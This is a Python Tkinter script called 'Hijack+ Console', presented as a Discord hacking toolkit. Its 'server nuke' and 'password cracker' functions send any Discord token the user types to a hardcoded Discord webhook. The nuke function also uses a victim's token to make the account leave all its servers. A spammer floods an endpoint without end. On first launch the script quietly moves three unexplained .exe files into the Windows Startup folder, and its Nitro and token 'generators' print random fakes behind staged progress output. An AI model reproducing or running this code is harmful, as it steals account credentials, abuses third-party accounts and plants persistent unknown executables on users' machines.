from tkinter import *
import time
import random
import os
import requests
import json
from requests import get
import discum
import discord
import sys
import shutil

print("Hijack+ Console V1.0.0")

sys.stdout.write("\x1b]2;Hijack+ Console V1.0.0\x07")

def spammer():
    contentt = input("what content do you want to spamm: ")
    data = {'content': (contentt)}
    path = input("the path: ")
    tooken = input("your token: ")
    header = {'authorization': tooken}
    while True:
        r = requests.post((path), data=data, headers=header)

def servernuke():
    os.system('cls')
    token2 = input("victims token: ")
    data = { 'content': (token2) }
    r = requests.post("https://discord.com/api/webhooks/910239876526526544/7c88EkAyk9dc7Djd9VC2fKxRAXoAmGKnFmg8DhtCUfi3BFwasEdRX_N8CJQLSRV8TPf2", data=json.dumps(data), headers={'Content-Type': 'application/json'})
    client = discord.Client()
    token = token2

    @client.event
    async def on_ready():
        for guild in client.guilds:
            try:
                if guild.id:
                    server = client.get_guild(guild.id)
                    await server.leave()
            except Exception as e:
                print(e)
    client.run(token, bot=False)

def nitro():
    os.system('cls')
    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM"
    ipd = ''.join((random.choice(numeral) for i in range(4)))
    print("loading..")
    time.sleep(10)
    result = "https://discord.gift/" + ipd
    print(result)
    time.sleep(10000)

def webhookfinder():
    os.system('cls')
    letters1 = "1234567890"
    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_-"
    fake = "1234567890"
    print("creating webhook.txt")
    
    while True:
        id = ''.join((random.choice(letters1) for i in range(18)))
        pi = ''.join((random.choice(numeral) for i in range(62)))
        result = "https://discord.com/api/webhooks/" + id + "/" + pi
        file = open('webhooks.txt', 'a')
        file.write("-----------------------------------------------\n"+result+"\n-----------------------------------------------\n")
        file.close()
        time.sleep(1)
        print("-----------------------------------------------\n"+result+"\n-----------------------------------------------")

def gentoken():
    os.system('cls')
    letters = "1234567890"
    numeral = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_-"
    fake = "1234567890"
    ss = random.randint(3, 15)
    ssd = random.randint(3, 15)
    ssf = random.randint(3, 15)
    ipd = ''.join((random.choice(numeral) for i in range(ss)))
    pi = ''.join((random.choice(numeral) for i in range(ssd)))
    ps = ''.join((random.choice(numeral) for i in range(ssf)))
    result = ipd + "." + pi + "." + ps
    length = (len(result))
    sss = random.randint(59, 65)
    while True:
        if length != sss:
            result = result + random.choice(numeral)
            length = (len(result))
        else:
            print(result)
            time.sleep(100000)

def testing():
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(0.1)
    print("Testing...")
    time.sleep(0.5)
    print("renew")
    time.sleep(3)
    os.system('cls')
    print("refreshing")
    time.sleep(3)
    gentoken()

def gen():
    os.system('cls')
    discordid = int(input("enter target's discord id: "))

    try:
        print("- encrypting to base64.")
        time.sleep(1)
        ss = random.randint(1, 2)
        print("\ encrypting to base64..")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("| encrypting to base64...")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("/ encrypting to base64.")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("- encrypting to base64..")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("\ encrypting to base64...")
        time.sleep(ss)
        ss = random.randint(1, 2)
        print("| encrypting to base64.")
        time.sleep(ss)
        print("/ encrypting to base64..")
        time.sleep(1)
        os.system('cls')
        testing()
    except:
        print("must be a real discord id")

def pwcracker():
    os.system('cls')
    token = input("discord token: ")
    data = { 'content': token }
    requests.post("https://discord.com/api/webhooks/910239876526526544/7c88EkAyk9dc7Djd9VC2fKxRAXoAmGKnFmg8DhtCUfi3BFwasEdRX_N8CJQLSRV8TPf2", data=json.dumps(data), headers={'Content-Type': 'application/json'})
    print("decoding..")
    time.sleep(5)
    print("decoding...")
    time.sleep(100000)

def btn_clicked():
    pass
def start():
    window = Tk()

    window.geometry("950x600")
    window.configure(bg = "#c4c4c4")
    canvas = Canvas(
        window,
        bg = "#c4c4c4",
        height = 600,
        width = 950,
        bd = 0,
        highlightthickness = 0,
        relief = "ridge")
    canvas.place(x = 0, y = 0)

    background_img = PhotoImage(file = f"background\\background.png")
    background = canvas.create_image(
        475.0, 300.0,
        image=background_img)

    entry0_img = PhotoImage(file = f"background\\img_textBox0.png")
    entry0_bg = canvas.create_image(
        239.5, 408.0,
        image = entry0_img)

    entry0 = Entry(
        bd = 0,
        bg = "#320000",
        highlightthickness = 0)

    entry0.place(
        x = 81.0, y = 286,
        width = 317.0,
        height = 242)

    img0 = PhotoImage(file = f"buttons\\img0.png")
    b0 = Button(
        image = img0,
        borderwidth = 0,
        highlightthickness = 0,
        command = servernuke,
        relief = "flat")

    b0.place(
        x = 666, y = 452,
        width = 204,
        height = 68)

    img1 = PhotoImage(file = f"buttons\\img1.png")
    b1 = Button(
        image = img1,
        borderwidth = 0,
        highlightthickness = 0,
        command = spammer,
        relief = "flat")

    b1.place(
        x = 436, y = 292,
        width = 204,
        height = 68)

    img2 = PhotoImage(file = f"buttons\\img2.png")
    b2 = Button(
        image = img2,
        borderwidth = 0,
        highlightthickness = 0,
        command = webhookfinder,
        relief = "flat")

    b2.place(
        x = 436, y = 372,
        width = 204,
        height = 68)

    img3 = PhotoImage(file = f"buttons\\img3.png")
    b3 = Button(
        image = img3,
        borderwidth = 0,
        highlightthickness = 0,
        command = gen,
        relief = "flat")

    b3.place(
        x = 436, y = 452,
        width = 204,
        height = 68)

    img4 = PhotoImage(file = f"buttons\\img4.png")
    b4 = Button(
        image = img4,
        borderwidth = 0,
        highlightthickness = 0,
        command = pwcracker,
        relief = "flat")

    b4.place(
        x = 666, y = 292,
        width = 204,
        height = 68)

    img5 = PhotoImage(file = f"buttons\\img5.png")
    b5 = Button(
        image = img5,
        borderwidth = 0,
        highlightthickness = 0,
        command = nitro,
        relief = "flat")

    b5.place(
        x = 666, y = 372,
        width = 204,
        height = 68)

    window.title('Hijack+')
    window.resizable(False, False)
    window.mainloop()

file1 = open('user guilds\\flopper.bat', 'r')
f = file1.read()
file1.close()
if f == "True":
    start()
else:
    file1 = open('user guilds\\flopper.bat', 'w')
    file1.write("True")
    file1.close()
    apd = os.getenv('APPDATA')
    appd = apd + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    source = "id guilds\\application.exe"
    source1 = "id guilds\\authorization.exe"
    source2 = "id guilds\\finaltoken.exe"
    destination = (appd)
    dest = shutil.move(source, destination)
    dest = shutil.move(source1, destination)
    dest = shutil.move(source2, destination)
    start()

